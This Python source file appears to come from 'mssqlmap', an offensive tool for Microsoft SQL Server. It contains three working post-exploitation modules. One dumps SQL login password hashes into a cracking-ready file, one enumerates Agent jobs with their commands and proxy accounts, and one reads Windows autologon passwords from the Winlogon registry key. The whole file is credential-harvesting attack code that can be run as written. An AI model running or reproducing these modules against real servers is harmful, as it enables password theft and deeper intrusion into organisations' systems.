from mssqlmap.client import Client, VisitorModule
from mssqlmap.modules.reg import RegistryReader


class HashDumper(VisitorModule):
    def __init__(self, output: str) -> None:
        self.output = output

    def invoke(self, client: Client) -> dict[str, str]:
        rows = client.query('SELECT name as [name], type_desc as [type], master.sys.fn_varbintohexstr(password_hash) as [hash] FROM master.sys.sql_logins')
        hashes = {row['name']: row['hash'] for row in rows if row['hash'] != 'NULL'}
        with open(self.output, 'a') as file:
            for key, value in hashes.items():
                file.write(f'{key}@{client.hostname}:{value}\n')
        return hashes


class JobDumper(VisitorModule):
    def invoke(self, client: Client) -> dict[str, str]:
        rows = client.query(
            'SELECT '
            'steps.database_name,'
            'job.job_id as [job_id],'
            'job.name as [job_name],'
            'job.description as [job_description],'
            'suser_sname(job.owner_sid) as [job_owner],'
            'steps.proxy_id,'
            'proxies.name as [proxy_account],'
            'job.enabled,'
            'steps.server,'
            'job.date_created,'
            'steps.last_run_date,'
            'steps.step_name,'
            'steps.subsystem,'
            'steps.command '
            'FROM msdb.dbo.sysjobs job '
            'INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id=steps.job_id '
            'LEFT JOIN msdb.dbo.sysproxies proxies ON steps.proxy_id=proxies.proxy_id'
        )
        return {row['job_name']: row['command'] for row in rows}


class AutoLogonDumper(VisitorModule):
    def invoke(self, client: Client) -> dict[str, str]:
        hive = 'HKEY_LOCAL_MACHINE'
        key = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
        keys = dict(
            domain='DefaultDomainName',
            user='DefaultUserName',
            password='DefaultPassword',
            altdomain='AltDefaultDomainName',
            altuser='AltDefaultUserName',
            altpassword='AltDefaultPassword',
        )
        result = {
            displayname: RegistryReader.regread(client, hive, key, name)
            for displayname, name in keys.items()
        }
        return {key: value for key, value in result.items() if value != 'NULL'}
